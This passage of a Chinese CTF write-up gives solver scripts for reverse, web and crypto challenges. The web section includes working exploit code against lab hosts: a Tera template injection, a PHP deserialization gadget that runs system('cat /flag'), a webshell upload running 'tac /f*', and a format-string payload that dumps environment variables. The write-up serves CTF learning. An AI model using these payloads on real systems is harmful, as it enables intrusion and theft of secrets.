class="hljs-number">169</span>,  <span class="hljs-number">92</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">27</span>, <span class="hljs-number">241</span>, <span class="hljs-number">152</span>,  <span class="hljs-number">61</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">89</span>,<br>   <span class="hljs-number">63</span>,  <span class="hljs-number">20</span>, <span class="hljs-number">252</span>, <span class="hljs-number">122</span>, <span class="hljs-number">244</span>, <span class="hljs-number">100</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">43</span>]<br><br><span class="hljs-built_in">dict</span> = &#123;&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-built_in">dict</span>[(<span class="hljs-number">23</span>*(i)+<span class="hljs-number">66</span>)&amp;<span class="hljs-number">0xff</span>]=i<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>)<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(msg),<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        t=msg[ip:ip+<span class="hljs-number">12</span>]<br>        tmp=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t]<br>        data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">4</span>):<br>            data.append(<span class="hljs-built_in">int</span>.from_bytes(tmp[i:i+<span class="hljs-number">4</span>],<span class="hljs-string">&quot;little&quot;</span>))<br>        get = data<br><br>        v23 = get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">4</span>] + v23<br>        v25 = (get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">2</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">5</span>] ^ v25)<br>        data[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">2</span>] + v23<br>        v25 = (get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">1</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">3</span>] ^ v25)<br>        data[<span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j] + v23<br>        v25 = (get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">1</span>]&lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">0</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">1</span>] ^ v25)<br>        data[<span class="hljs-number">0</span>]&amp;=<span class="hljs-number">0xffffffff</span><br><br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            i1=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(data[item])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>))][::-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                msg[ip+<span class="hljs-number">4</span>*item+i2]=<span class="hljs-built_in">dict</span>[i1[i2]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(msg))<br></code></pre></td></tr></table></figure><h2 id="bad-pe"><a href="#bad-pe" class="headerlink" title="bad_pe"></a>bad_pe</h2><p><img src="/mdimg/2023pcb/2.png"><br>è¿™é‡Œæœ‰ä¸ªå¼‚æˆ–0x23ï¼Œå¯¹.ATOMæ®µè¿›è¡Œå¼‚æˆ–ï¼Œå¯ä»¥æ¢å¤ç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad_pe.exe&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>encode = data[<span class="hljs-number">0x2e00</span>:<span class="hljs-number">0x10c00</span>]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>    t.append((encode[i]^<span class="hljs-number">0x23</span>)&amp;<span class="hljs-number">0xff</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.exe&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        f.write(t[i].to_bytes(<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023pcb/3.png"><br>rc4åŠ å¯†ï¼Œè°ƒè¯•æ‰¾åˆ°å¯†é’¥å’Œå¯†æ–‡å³å¯<br><img src="/mdimg/2023pcb/4.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p><a href="https://blog.xinshijiededa.men/writeup/buaactf-2023/">https://blog.xinshijiededa.men/writeup/buaactf-2023/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><br>url = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span><br><br>string = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&quot;</span><br><br><span class="hljs-comment"># proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8081&quot;&#125;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&#123;% set arr = [__tera_context] %&#125;</span><br><span class="hljs-string">&#123;% set f = get_env(name=&quot;fl&quot;~&quot;ag&quot;) %&#125;</span><br><span class="hljs-string">&#123;%- for char in __tera_context -%&#125;</span><br><span class="hljs-string">    &#123;%- if char == &#x27;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;&#x27; -%&#125;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;%- else -%&#125;</span><br><span class="hljs-string">    &lt;</span><br><span class="hljs-string">    &#123;%- endif -%&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;&quot;&quot;&quot;</span><br>    res = requests.post(url=url, data=data)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hacker</span>&#123;<br>    private $exp;<br>    private $cmd;<br><br>    public  function __toString()<br>    &#123;<br>        call_user_func(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">H</span><br>&#123;<br>    public $username=<span class="hljs-string">&quot;admin&quot;</span>;<br>    public function __destruct()<br>    &#123;<br>        $this-&gt;welcome();<br><br>    &#125;<br>    public  function welcome()<br>    &#123;<br>        echo <span class="hljs-string">&quot;welcome~ &quot;</span>.$this-&gt;username;<br>    &#125;<br>&#125;<br><br><br>$res=new H();<br>$rev = new Hacker();<br>$res-&gt;username=$rev;<br>echo serialize($res);<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5:80/&quot;</span><br>dirs = <span class="hljs-string">&quot;abcdef1234567890&quot;</span><br>exp = <span class="hljs-string">&quot;glob://backdoor_&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dirs:<br>        tmp = exp + i + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>: tmp&#125;<br>        content = requests.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes!!!&quot;</span> <span class="hljs-keyword">in</span> content:<br>            exp = exp + i<br>            <span class="hljs-built_in">print</span>(exp)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=<span class="hljs-number">1</span>&amp;title[]=.php&amp;data[]=&lt;?php system(<span class="hljs-string">&#x27;tac /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>:<span class="hljs-number">10000</span>/?username=%7Bpasshash.__str__.__globals__%5Bapp%5D.wsgi_app.__globals__%5Bos%5D.environ%7D&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SecretShare"><a href="#SecretShare" class="headerlink" title="SecretShare"></a>SecretShare</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python">res = <span class="hljs-string">&#x27;&#x27;&#x27;27322282703709511636610535806856853612612796524565963685352821215367702697670029638291472271242231649191714479260517868076984065989639273952206721225394449809512736309152963717666213669565294618889004878502587203292128915123582846437035618297859622373514552659661751919687138158714389205196365694996691846589 48569244180151557205855904296808011040310995626104180491157243372509052545941856322458676083637192423759673249488348244220016168699221727901608142636001227515271570470832957720323162015971262916929310707561503164723954043820660896942792324593262461443662124187475159194385198887788939215142063719188348359051</span><br><span class="hljs-string">91805670014258342004112051538515158497977951249015335208828337677065661825541672701641011001509677094927054079355384880161339840664535548572711525978354947655159331190183669338379535914171636373271711777662899462412133698069202075760175522929409084089926367963132890460921167025666146228784502671381146711019 399560428917764748532974912549579755263000603891290776423346071350694440330590365031312031331274402458285677563081638572382883720599282186196046608483533823720739712120092762382758124206813101015928952314835833408960456083078746116580899849811889743359253318716527623535224217277574914341453477162101109304521</span><br><span class="hljs-string">66920426958285786458658248767160362920977647430969423155679844462544037512659182174429654322739226216034435833627040279237803034255254749729584723025199164153117416758037930376665769001615518843769072788984118288795594844920830871790000441610452127329422157793240336858492947908675187651204641324347460068225 544937610110319318485732752819003299421900030583201619755186005418563198983178922830516722630658659738570688423587906326520697827239870483140381321035311084086872965680985895264808839131965351704781276541438910273061170401708989341983455583148675268945159916067944049744805262336310315984482684477033006734287</span><br><span class="hljs-string">5635003138990118507194506070175086831788576611651929217926664518872856396687497543355452282932759792957815071333069987192436081970967301109108636547955400620912244311244917063515500624803643902206301188548901042409824866123277584384961209855675044800618682367677428510425729333590673520619706804051348640739 216744037211012509915361607447276981890614637104708083303422302996997658600655325492799426696396129495740380030328486134561677905050895542824084902986133831827678164847190414920208201189028697970734101241668427915881431218718486605095651504942024880541330783245275847421981881418579001271393784051391703426641</span><br><span class="hljs-string">42911212495890251189243677773682023641022813626312578449123776026147091248993904833237700742589532896024024290404122897946672451644535270088285040557715419433742408043822628453894022912746599564701384030731888203683342200542550299021286164291609827209395613247858235556551967071480178477133096158123879827699 358625812085590413825860316781088505612223852757468112073999439178735803245018313087878704846077887688463179850461438873261474235563220723161414348183847290126780153336526214025645436877174640254582752642464699350692290355463838062957644227630261763964930791440438099097640358707938365934460765509770713422802</span><br><span class="hljs-string">76393649631519338646914577444953093042692772742019473672660460181129677128343169843350211463697634615281051117955282687134957585026912161500321667521577171255986824727912674810018184784281896427202094684250866650111325600908495879530295097533881586073569958225485019114664641193908557023741440163457101525203 329857997030576972729986815876777011654061886138716155424533348668225264710995265453134377944058890193085147694227229106567976594481366856016163332702128728982600129466565167735283489379015199424332093096162272256722421083932784837620468049877168507039726118947169347011547142986416984741443370137649949904461</span><br><span class="hljs-string">79331720524907914908041917436319036255433828287857696014126718015259444328868691897077115926451094233087906865422458137916362681754241848523015955481140065721679824678490152910531795497192050173146826300375546645932629884190392808650921115445830421927238985963684104496062702531620988113510613763043301631209 521812627987763620197812504899506910796946504850708570349667428211492401785051233252744740254058319678959842396710646375803470815528610618211136953181796072686187773678649762524131730689630306575027480171902373722358678386430941181209464823845330723780859962168995759134414896419704465387883718956885830089204</span><br><span class="hljs-string">34982047515239854027766260430773762615551551624040650169394931537920509836795394460680530502277933252344187876902284046236616780767724165813414385632503982500888235012434695560644146038269348824756839799255778718600829638272259933042402900324341026396868817418250681063616205184019449176410323763562609906256 620605218346899770429088593442355698411635752845778736545505196875522232769153705673917137123151382118878693457232039690080398947092819660645917999264381455940649845030563994094759265923737413658758514560434230280086651591011706752452769554749328591613510563389443179182520711924593818729897121279090347342924</span><br><span class="hljs-string">152419925215633402551037300484006425703951620959940334562270582763998688826301000834158083436618204487451531847804246279293440954881219913553470971941979760351736535195521294640333019382215259554425750740788262905693120027837778006639912907313405166887419201498400381605572044667968915799849914769886304855469 534016646028730727016209888504911167747835078463480349483097394578844831015450227232096300754745773717118904569821782762146568167060585024245190142726454552015507956174745334336178848983708347742569471390328051491668238788357493167057460607669219247924675410096486695085439718252206048534436114032676610106347</span><br><span class="hljs-string">7879488845815070796446980042322339499701160196159748256186513316298957679171765636643576866967308539398870809808590995575054707633585889782359230149070757943670854204408729244422811261494912348733104477093541158692065916137178255072991528458124264991587844119002172895462900656781795781239777162351236329010 88871679849011995091477347542680893996957786653924621705917895209560005458566552006873467270402185918706978818367798743110976595300781848502254399030378598802075501163781912730014790884964070072432678736909128727529050058640555516131888412874572332236693843543870582425734398659970857777429709921292338764056</span><br><span class="hljs-string">127514038284722450386599280575918286761060061225148526034466492640545892790142008459404252129894996614536417849770574953585543450549469396103606474736901175227788222676384874264401431651217507860669506781393523454290522077615631381023377385798837961138591946856445250933293025411868935836885350047926486897489 77024841353020037736072564671223528105040202905964518913084686725674447555778849580882283151820241410917813178127609045792603404416216635536183501218256797138848233777386900397758052436048023588018973775841429672943588531118120531410941119451112420484244073744860360930771612798228353879418110447613074103121</span><br><span class="hljs-string">73523397212562449962797322407800812476585158706372414597501601851658987192829920809491154804458216832212324494892234069944533082031068984251998442644045753330748501446440305199570609290581400456976816997103538669480916305434314437973807842397862244118575425198027445648296131215572682266387781847672276278105 358131172545144245017725954943677533669555698100417873957892816178502113778385580423968891034087567143540060215845324391804373505677355257229040486254496477702089813554705646138200115877254745085768546159462550014224359419574896275660358462631189412166193397952134507043404147073495973377634175173793168251233</span><br><span class="hljs-string">147348014782035263557672447461924770257688598176948741569841957313948631675235455168853571742962013610522674191595258437726941866803703946285611136667070559549648062172513441677274884328986422767953568184453855423313870118663236611714535321243624425127415452246621538957156768109051856015526921750034402814181 595636882372433751112400377321820719222073583356736222414778628384644623278463447644996314505722523949309416112422725194730843858188224367723911893838329601709038981556011159397788345709995936511801237268248578658463705897357408752571102163768839107050797667376601808299838509114230891979045461260911946415320</span><br><span class="hljs-string">107396275167806069862891568873373042687841775147343147252292584080352003252925523814251826627764872245643578589633919368796490434000761591564932634968812847926559005905574630301932715978159346119216934096015784765061798867698507880003720720252714582289061793936959096457352973294797409716470781535683208662390 395153432543738329086362624068574193255148332584492341243454102818775521905404929692387305225461869410602734064349062513722129355095148212452014041134124275764033437990333449975234478218955405224252839531173866658663372361601107447751367104423527019655871175001744848253584734158351726745551407103825286804486</span><br><span class="hljs-string">111553464316331929637928443274530253217732988900086332463018159619552721468104642096142476958790984335379754112570481423047457696400188847850295271972015619208861578167810076654492163584804626343101458265888573313262592215690879907819608901681957001286346406746245896172209892822686784252329450759497940157817 511651161619212591638982125008326295422605195202233521320827338823708335474320214987121320809834264020752488400694820412703895872293388034242395958165882000777796549830919064001864919411540442573874044781198129468230793584507078981976925332170577699344654086418908951152825866266645119298895702972413286583958</span><br><span class="hljs-string">152943203796417374728939496393486026220901654584673108139041097288333960510566510856084351323729904924640199712274885275910827036984793221821982353991291820643933058458639690879406578278096815789977814737418245161029735350306516366692394206323956675431185964629143452067819609148096407834611672577927865412392 601919715680710925447421076338078877766683489886991843150153117466383328925764100913643134608445665513170565014760605822708267601346612031986281277217875335899155526135282569237278337539198315798958944970975021604720637053079350115793916435033122479416157536224071649845398032404766802667331247026412465230897</span><br><span class="hljs-string">166939346435092804149361985966477026395490869535977170373479116381554623702088662590719710620315106535772321371981485114999353813392487182004380368980412304867141197881584179316802946420573712884869207029807032629508803275758495901655593573546020371363238621118513519707566850164838945538265367877703756561143 234820987787318061334406237477763453845428872967687650137534289159784627741552971152526376041477941966693305257682995443922827379938186523574311761092208293391813942996139561570362972331975732091581332378414745250571717259039007898729580445364373819332663464831222506646891337600543033325723536694430603794811</span><br><span class="hljs-string">26423433781831557303965218555715659459964805457875828323769054957811368313465747671809917056868138188812894920739462390440860614780050790166810205409831687879766298929374237068956851330280802672993787657036328401560347701569533751904003924033296103431436132762238032533631035466975563403490612905290747500034 564564388847953966153849841262670748320376369154008357907963983929690302350574296789978591185246923974920161797995189321841257011791368992972604074119872162539552292552362460968499190796503841035750507639233595470833894116053816701560762298879109510469040808411623441894361241720213857716595525048872499260906</span><br><span class="hljs-string">67047973882442026847054596043723251652019181826511387455752441275468608245799296406017022023236054643173589545621722148324431435563020855357273526765167504290556087855144498047600331414488129605467552541562176094510433084299150667280746009871632940612151871433089450237469253872190728223812058292760792048327 190023992656957817692909813007060815279103259429273681430127196398700351704377473750794054807013341268132331757606642253453911294388801612173064841530999650755116853772677649649669913317951539550313189351839325961495963700012333982508285993230904890545000476087981313109451079110864357972818329854737276461934</span><br><span class="hljs-string">105924866908333941056520542136279835222849349889633638544229314020165638653054683617844504431167584527725854457445810982830025832114705779346552001573819055283000133195971409988231558773967828820675125138322725072735898886865540351014422681184954059397593545246946913932272750078695992276555307091275819914167 590597067702351181983043135203878889479903130263737024839941242154123057325926009112777887235038694551309864253859910817785607380293492455212053557033975616644911248422981687394189486917578693691299595122658518879946708562394161159104748320544408107959224087679644857953504156164164979544525935685064483284685&#x27;&#x27;&#x27;</span><br>p = <span class="hljs-number">667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029</span><br>c = <span class="hljs-number">9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912</span><br>N = <span class="hljs-number">11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_shift</span>(<span class="hljs-params">x, shift, <span class="hljs-built_in">type</span>, mask=<span class="hljs-number">0xffffffff</span>, nbit=<span class="hljs-number">32</span></span>):<br>    res = x<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit//shift):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_extract</span>(<span class="hljs-params">x</span>):<br>    x = inverse_shift(x, <span class="hljs-number">18</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    x = inverse_shift(x, <span class="hljs-number">15</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">4022730752</span>)<br>    x = inverse_shift(x,  <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">2636928640</span>)<br>    x = inverse_shift(x, <span class="hljs-number">11</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">x</span>):<br>    y = x<br>    y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>    y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>    <span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_twist</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">state</span>):<br>    mt = state[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>        y = (mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ 